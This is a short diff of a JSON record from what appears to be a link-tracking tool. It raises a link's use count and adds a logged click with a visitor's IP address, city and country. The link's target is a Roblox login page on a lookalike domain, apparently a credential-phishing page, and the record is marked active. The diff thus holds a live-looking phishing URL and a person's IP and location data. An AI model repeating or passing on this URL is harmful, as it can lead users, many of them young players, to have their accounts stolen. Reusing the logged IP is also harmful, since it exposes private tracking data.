@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1271,
+    "useCount": 1272,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10307,6 +10307,14 @@
       },
       {
         "timestamp": 1777363692369,
+        "ip": "103.242.126.245",
+        "country": "Tonga",
+        "city": "Nuku'alofa",
+        "flag": "🇹🇴",
+        "countryCode": "TO"
+      },
+      {
+        "timestamp": 1777363890707,
         "ip": "103.242.126.245",
         "country": "Tonga",
         "city": "Nuku'alofa",
